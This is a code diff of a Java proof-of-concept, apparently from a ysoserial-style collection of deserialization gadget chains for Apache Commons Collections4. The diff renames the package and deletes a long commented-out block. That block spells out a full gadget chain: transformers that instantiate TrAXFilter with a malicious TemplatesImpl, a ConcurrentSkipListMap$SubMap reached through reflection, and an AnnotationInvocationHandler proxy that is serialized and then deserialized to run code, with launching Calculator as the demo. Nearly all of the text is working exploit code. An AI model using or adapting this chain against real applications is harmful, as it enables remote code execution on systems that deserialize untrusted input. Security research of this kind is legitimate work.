@@ -1,4 +1,4 @@
-package payload;
+package ysoserial.payloads.tabbyGadgetChains.CommonCollections4;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import org.apache.commons.collections4.Transformer;
@@ -39,9 +39,6 @@ import java.util.concurrent.ConcurrentSkipListMap;
  */
 
 
-//   java.util.concurrent.ConcurrentSkipListMap$SubMap
-//CCV4_7_4
-
 public class CC4_Poc9 {
     public static void main(String[] args) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");
@@ -73,67 +70,6 @@ public class CC4_Poc9 {
         //         deserialize
         ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
         inputStream.readObject();
-
-
-
-
-
-
-
-
-
-
-//        final Object templates = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");
-//
-//
-//        ConstantTransformer constant = new ConstantTransformer(String.class);
-//
-//        Class[] paramTypes = new Class[] { String.class };
-//        Object[] arg = new Object[] { "foo" };
-//
-//        InstantiateTransformer instantiate = new InstantiateTransformer(
-//                paramTypes, arg);
-//
-//
-//        Transformer[] transformers = new Transformer[]{
-//                constant, instantiate
-//        };
-//
-//        ConcurrentSkipListMap concurrentSkipListMap = new ConcurrentSkipListMap<>(new TransformingComparator(new ChainedTransformer(transformers)));
-//        concurrentSkipListMap.put("asd","asd");
-//
-//
-//        Class clazz2 = Class.forName("java.util.concurrent.ConcurrentSkipListMap$SubMap");
-//        Constructor bindingEnumerationConstructor = clazz2.getDeclaredConstructor(ConcurrentSkipListMap.class, Object.class,boolean.class,Object.class,boolean.class,boolean.class);
-//        bindingEnumerationConstructor.setAccessible(true);
-//        Object bindingEnumerationObject = bindingEnumerationConstructor.newInstance(concurrentSkipListMap, null,true,null,true,true);
-//
-//
-//        Reflections.setDeclaredField(constant, "iConstant", TrAXFilter.class);
-//        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
-//        arg = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
-//        paramTypes[0] = Templates.class;
-//        arg[0] = templates;
-//
-//
-//        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-//        Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
-//        construct.setAccessible(true);
-//        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,bindingEnumerationObject);
-//        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
-//        handler = (InvocationHandler) construct.newInstance(Retention.class,mapProxy);
-//
-//
-//
-//        //         serialize
-//        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccv4"));
-//        outputStream.writeObject(handler);
-//        outputStream.close();
-//
-//
-//        //         deserialize
-//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccv4"));
-//        inputStream.readObject();
 
     }
 }
